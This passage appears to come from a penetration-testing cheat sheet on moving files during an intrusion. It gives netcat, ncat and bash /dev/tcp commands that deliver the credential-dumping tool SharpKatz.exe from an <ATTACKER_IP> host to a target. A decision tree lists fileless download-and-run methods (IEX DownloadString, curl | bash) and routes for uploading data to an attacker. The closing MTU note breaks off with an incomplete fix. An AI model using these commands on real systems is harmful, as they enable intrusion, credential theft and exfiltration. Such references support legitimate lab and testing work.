<Accordion title="Netcat / Ncat File Transfers">

### Netcat / Ncat File Transfers

**File Transfers for Linux and Windows**

```bash
# On target (listener — receives file)
nc -l -p 8000 > SharpKatz.exe               # original netcat
ncat -l -p 8000 --recv-only > SharpKatz.exe  # ncat version

# On attacker (sends file)
nc -q 0 <TARGET_IP> 8000 < SharpKatz.exe               # -q 0 = quit after EOF
ncat --send-only <TARGET_IP> 8000 < SharpKatz.exe       # ncat version
```

**File Transfers for Linux and Windows**

```bash
# On attacker (listener — sends file)
sudo nc -l -p 443 -q 0 < SharpKatz.exe
sudo ncat -l -p 443 --send-only < SharpKatz.exe

# On target (connects and receives)
nc <ATTACKER_IP> 443 > SharpKatz.exe
ncat <ATTACKER_IP> 443 --recv-only > SharpKatz.exe
```

**File Transfers for Linux and Windows**

```bash
# Attacker listens
sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Target connects with bash
cat < /dev/tcp/<ATTACKER_IP>/443 > SharpKatz.exe
```

<Accordion title="Quick Decision Tree">

### Quick Decision Tree

**File Transfers for Linux and Windows**

```text
DOWNLOADING TO WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest or WebClient.DownloadFile
├── Only cmd.exe?       → certutil or bitsadmin
├── Internal network?   → SMB (impacket-smbserver)
├── Need fileless?      → IEX + DownloadString
└── Nothing works?      → Base64 encode/decode via clipboard

DOWNLOADING TO LINUX:
├── Have curl/wget?     → Use them (simplest)
├── Need fileless?      → curl | bash  or  wget -qO- | python3
├── Have Python/PHP?    → Use language one-liners
├── Nothing available?  → /dev/tcp bash trick
└── Need encryption?    → OpenSSL s_server/s_client

UPLOADING FROM WINDOWS:
├── Have PowerShell?    → Invoke-WebRequest -Method PUT (to Nginx)
├── Only cmd.exe?       → certreq.exe -Post (to netcat listener)
├── Internal network?   → SMB or WebDAV
└── Nothing works?      → Base64 encode → copy-paste → decode on attacker

UPLOADING FROM LINUX:
├── Have curl?          → curl -T file (to Nginx PUT) or curl -X POST (to uploadserver)
├── Have SCP?           → scp file user@attacker:/path/
├── Have Python?        → python3 requests.post one-liner
└── Nothing works?      → Start python3 -m http.server on target, wget from attacker
```

<Accordion title="🚨 THE MTU TRAP">

### 🚨 THE MTU TRAP

**Pivoting and File Transfer: Field Reference**

Context from the notebook: Symptom:  SSH/RDP/PKINIT/LDAPS  connects then hangs , or "Connection reset by peer", while  ping  and  nc -z &lt;port>  succeed.  Cause:  small packets (SYN, ping) pass, but the  large packets  (SSH key exchange, RDP/TLS handshake, a Kerberos AS‑REQ carrying a certificate) exceed the VPN's path MTU, get fragmented, and are dropped.  Fix:

```text
nc -z <port>
```
